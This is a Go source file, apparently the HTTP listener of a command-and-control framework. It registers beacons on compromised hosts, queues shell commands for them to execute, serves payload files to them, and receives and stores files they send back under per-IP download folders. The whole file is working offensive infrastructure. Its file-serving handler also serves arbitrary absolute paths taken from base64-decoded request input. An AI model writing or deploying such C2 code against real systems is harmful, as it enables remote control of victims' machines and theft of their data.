package main 

import (
	"io"
	"os"
	"log"
	"fmt"
	"time"
	"mime"
	"bytes"
	"strings"
	"strconv"
	"net/http"
	"io/ioutil"
	"path/filepath"
	"encoding/json"
 	b64 "encoding/base64"
	"github.com/gorilla/mux"
)

type IHttpListener interface {
	startListener() (error)
	webInterfaceHandler(http.ResponseWriter, *http.Request)
	receiveFile(*Beacon, http.ResponseWriter, *http.Request)
	saveBeaconFile(*Beacon, bytes.Buffer, string)
	beaconUploadHandler(http.ResponseWriter, *http.Request)
	beaconGetHandler(http.ResponseWriter, *http.Request)
	beaconPostHandler(http.ResponseWriter, *http.Request)
}

type HttpListener struct {
	iface string
	hostname string
	port int
}

func (server HttpListener) startListener() (error) {
	var router = mux.NewRouter()
	var ifaceIp = getIfaceIp(server.iface)
	router.HandleFunc("/{data}", server.beaconPostHandler).Host(server.hostname).Methods("Post")
	router.HandleFunc("/{data}", server.beaconGetHandler).Host(server.hostname).Methods("Get")
	router.HandleFunc("/d/{data}", server.beaconUploadHandler).Host(server.hostname).Methods("Get")

	staticFileDirectory := http.Dir("./www/")
	staticFileHandler := http.StripPrefix("/c2/", http.FileServer(staticFileDirectory))
	router.PathPrefix("/c2/").Handler(staticFileHandler).Methods("GET")

	srv := &http.Server{
        Handler:      router,
        Addr:         ifaceIp + ":" + strconv.Itoa(server.port),
        WriteTimeout: 15 * time.Second,
        ReadTimeout:  15 * time.Second,
    }

	go func() {
    	log.Fatal(srv.ListenAndServe())	
	}()

	return nil
}

func (server HttpListener) receiveFile(beacon *Beacon, w http.ResponseWriter, r *http.Request) {
    r.ParseMultipartForm(32 << 20)
    var buf bytes.Buffer
    file, header, err := r.FormFile("file")
	
	if err != nil {
        fmt.Println("Failed to receive file.")
		return
    }

    defer file.Close()
    name := strings.Split(header.Filename, "/")
    io.Copy(&buf, file)
    server.saveBeaconFile(beacon, buf, name[len(name)-1])
    buf.Reset()
}

func (server HttpListener) saveBeaconFile(beacon *Beacon, data bytes.Buffer, name string) {
	path := "downloads"
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}
	path += "/" + beacon.Ip
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}
	path += "/" + beacon.Id
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}

	err := ioutil.WriteFile(path + "/" + name, data.Bytes(), 0644)
    if err != nil {
		fmt.Println("Failed to save file.")
	}

	cwd, err := os.Getwd()

	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Saved " + name + " from " + beacon.Id + "@" + beacon.Ip + " to " + cwd + "/" + path + "/" + name)
}

func (server HttpListener) beaconUploadHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Serving file to beacon.")
	file := mux.Vars(r)["data"]
	plaintext, _ := b64.StdEncoding.DecodeString(file)
	fullPath := string(plaintext)

	if plaintext[0] != '/' {
		path, err := os.Getwd()
		if err != nil {
			log.Fatal(err)
		}
		fullPath = path + "/uploads/" + string(plaintext)
	}

	w.Header().Set("Content-Type", mime.TypeByExtension(filepath.Ext(fullPath)))
	http.ServeFile(w, r, fullPath)
}

func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Request) {
	var update CommandUpdate
	data := mux.Vars(r)["data"]
	respMap := make(map[string][]string)
	decoded, _ := b64.StdEncoding.DecodeString(data)
	json.Unmarshal(decoded, &update)
	beacon := registerBeacon(update)
	decodedData, _ := b64.StdEncoding.DecodeString(update.Data)

	respMap["exec"] = beacon.ExecBuffer
	respMap["download"] = beacon.DownloadBuffer
	respMap["upload"] = beacon.UploadBuffer

	json.NewEncoder(w).Encode(respMap)
	beacon.ExecBuffer = nil
	beacon.DownloadBuffer = nil
	beacon.UploadBuffer = nil

	if len(update.Data) > 0 {
		if update.Type == "exec" {
			out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
			fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
			fmt.Println("\t" + out[:len(out)-1])
		} else if update.Type == "upload" {
			if(decodedData[0] == '1') {
				f := strings.Split(string(decodedData), ";")
				fmt.Println("Uploaded file to " + beacon.Id + "@" + beacon.Ip + ":" + f[1])
			} else if(decodedData[0] == '0') {
				fmt.Println("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
			}
		}
		prompt()
	}
}

func (server HttpListener) beaconPostHandler(w http.ResponseWriter, r *http.Request) {
	var update CommandUpdate
	data := mux.Vars(r)["data"]
	decoded, _ := b64.StdEncoding.DecodeString(data)
	
	json.Unmarshal(decoded, &update)
	beacon := registerBeacon(update)

	if update.Type == "upload" {
		fmt.Println("Receiving " + update.Data + " from " + beacon.Id)
		server.receiveFile(beacon, w, r)
	}
}


